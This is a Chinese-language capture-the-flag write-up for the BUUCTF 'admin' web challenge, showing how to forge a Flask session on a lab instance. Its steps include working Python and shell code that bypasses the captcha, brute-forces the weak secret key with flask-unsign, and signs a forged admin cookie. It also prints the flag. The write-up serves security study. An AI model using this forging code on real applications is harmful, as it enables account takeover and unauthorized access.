---
title: "12-admin"
date: 2026-05-03
categories:
 - BUUCTF
 - WEB
---

## Flag

```
flag{bc3d6dfe-bc42-45a8-bdff-cea8989b80f7}
```

## 知识点

- Flask Session 伪造
- Flask session 结构：`{data}.{timestamp}.{signature}`，使用 URL 安全的 base64 编码
- Flask 使用 `itsdangerous.URLSafeTimedSerializer` + `TaggedJSONSerializer` 签名 session
- `flask-unsign` 工具：解码和暴力破解 Flask session secret key
- Flask session 压缩：当数据较大时，Flask 会使用 zlib 压缩 session 数据
- 验证码值存储在 Flask session 中（双层 base64 编码），而不是服务端
- `/change` 端点根据 `session['name']` 来确定修改哪个用户的密码（不当授权）
- 登录失败时 session 仍会设置 `name` 字段为尝试的用户名

## 解题步骤

### 1. 信息收集

访问首页，得到提示 `<!-- you are not admin -->`，说明需要以 admin 身份登录。

```bash
curl -s "http://1f3ba66d-6213-4166-bc56-2df4c0d4749d.node5.buuoj.cn:81/" | grep "not admin"
```

网站是一个 Flask 应用，可访问的功能：
- `/register` - 注册（需要验证码）
- `/login` - 登录（有 Remember Me 选项）
- `/change` - 返回 302 重定向到 `/login`，说明该端点存在但需要登录

登录成功后，从 `/index` 页面导航菜单中发现更多端点：
- `/index` - 首页，显示 `Hello {{ username }}`
- `/edit` - 发布帖子
- `/change` - 修改密码（表单只有一个 `newpassword` 字段）
- `/logout` - 登出

### 2. 发现验证码漏洞

访问 `/code` 获取验证码，发现 Flask session 中存储了验证码值：

```bash
curl -s -c /tmp/cookie.txt "http://1f3ba66d-6213-4166-bc56-2df4c0d4749d.node5.buuoj.cn:81/code" > /dev/null
cat /tmp/cookie.txt
```

解码 session（双层 base64）：

```python
import base64, json
# session payload 部分 base64 解码
payload = "eyJpbWFnZSI6eyIgYiI6ImQxTXpWQT09In19"  # 示例
decoded = base64.urlsafe_b64decode(payload + "==")
data = json.loads(decoded)
# 内层 base64 解码得到验证码
captcha = base64.b64decode(data['image'][' b'] + "==").decode()
print(captcha)  # 4位验证码
```

### 3. 自动注册账号

利用上述漏洞自动识别验证码并注册：

```python
import requests
from flask_unsign import session as flask_session

BASE = "http://1f3ba66d-6213-4166-bc56-2df4c0d4749d.node5.buuoj.cn:81"
s = requests.Session()

# 获取验证码 session
r = s.get(f"{BASE}/code")
decoded = flask_session.decode(s.cookies.get('session', ''))
captcha = decoded['image'].decode()

# 注册
s.post(f"{BASE}/register", data={
    'username': 'hacker36259',
    'password': 'hack123',
    'verify_code': captcha,
    'submit': 'register'
})

# 登录
s.post(f"{BASE}/login", data={
    'username': 'hacker36259',
    'password': 'hack123'
})
```

### 4. 获取源代码信息

访问 `/change` 页面，HTML 注释中包含源代码地址：

```bash
curl -s "http://xxx.node5.buuoj.cn:81/change" | grep github
# <!-- https://github.com/woadsl1234/hctf_flask/ -->
```

### 5. 破解 Flask Secret Key

使用 `flask-unsign` 暴力破解 session secret key：

```bash
# 安装工具
python3 -m venv /tmp/ctf-venv
source /tmp/ctf-venv/bin/activate
pip install flask-unsign

# 创建字典
cat > /tmp/wordlist.txt << EOF
secret
hctf
admin
hctf2018
flask
key
password
ckj123
EOF

# 破解
flask-unsign --unsign --no-literal-eval \
  --cookie 'eyJjc3JmX3Rva2VuIjp7...' \
  --wordlist /tmp/wordlist.txt
# [+] Found secret key after attempts: b'ckj123'
```

**Secret Key: `ckj123`**

### 6. 伪造 Admin Session

使用 `itsdangerous` 和 Flask 的 `TaggedJSONSerializer` 伪造 admin session：

```python
from itsdangerous import URLSafeTimedSerializer
from flask.json.tag import TaggedJSONSerializer
import hashlib

SECRET = 'ckj123'

# 创建与 Flask 相同的签名器
signer = URLSafeTimedSerializer(
    secret_key=SECRET,
    salt='cookie-session',
    signer_kwargs={'key_derivation': 'hmac', 'digest_method': hashlib.sha1},
    serializer=TaggedJSONSerializer()
)

# 伪造 admin session
forged_session = {
    '_fresh': True,
    '_id': 'bd6558b753c802fc17eec078fee34d7d40365dd730f8c9ff7adb4f8658434b0b1cfcc6db52760f68256be4dd2ee11d5f124046d967c5300a4a20919f1ec02d37',
    'image': 'xxxx',
    'name': 'admin',
    'user_id': '1'
}

admin_cookie = signer.dumps(forged_session)
```

> **关键点**：必须使用与 Flask 完全一致的签名方式。`flask-unsign --sign` 命令行工具签名格式不正确（会嵌套 JSON 字符串），需要直接在 Python 中使用 `itsdangerous` + `TaggedJSONSerializer` 签名。

### 7. 获取 Flag

使用伪造的 admin session 访问 `/index`：

```python
s = requests.Session()
s.cookies.set('session', admin_cookie)
r = s.get(f"{BASE}/index")
# 响应中包含: <h1 class="nav">Hello admin</h1>
# <h1 class="nav">flag{bc3d6dfe-bc42-45a8-bdff-cea8989b80f7}</h1>
```

## 漏洞总结

1. **验证码失效**：验证码值明文存储在 session cookie 中，可被自动识别
2. **弱 Secret Key**：Flask session 使用弱密钥 `ckj123`，可通过字典攻击破解
3. **Session 可控**：攻击者可以伪造任意用户（包括 admin）的 session
4. **不当授权**：`/change` 端点仅依赖 `session['name']` 来判断修改哪个用户的密码
